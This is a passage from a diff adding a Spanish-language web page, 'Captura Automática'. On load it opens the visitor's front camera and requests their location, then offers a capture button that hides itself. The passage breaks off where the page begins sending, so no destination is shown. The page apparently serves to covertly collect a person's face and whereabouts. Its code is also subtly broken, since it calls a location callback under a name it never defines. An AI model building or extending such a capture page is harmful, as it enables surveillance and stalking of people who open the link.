@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Captura Automática</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 20px; background-color: #f0f0f0; }
+        video { width: 100%; max-width: 300px; border-radius: 10px; margin-bottom: 10px; }
+        button { padding: 15px 30px; font-size: 16px; background: #0088cc; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        #status { margin-top: 10px; color: green; }
+    </style>
+</head>
+<body>
+    <h2>Capturando...</h2>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <button id="btn" onclick="capturar()">Capturar Ahora</button>
+    <p id="status"></p>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const btn = document.getElementById('btn');
+        const status = document.getElementById('status');
+
+        // Iniciar cámara frontal y obtener ubicación
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+            .then(stream => {
+                video.srcObject = stream;
+                // Intentar obtener ubicación al inicio
+                navigator.geolocation.getCurrentPosition(successLoc, errorLoc);
+            })
+            .catch(err => alert("Error al acceder a cámara o ubicación"));
+
+        function successPos(position) {
+            window.lat = position.coords.latitude;
+            window.lng = position.coords.longitude;
+            status.innerText = "Ubicación obtenida.";
+        }
+
+        function errorLoc() {
+            window.lat = "N/A";
+            window.lng = "N/A";
+            status.innerText = "Ubicación no disponible.";
+        }
+
+        function capturar() {
+            btn.style.display = 'none';
+            status.innerText = "Envi
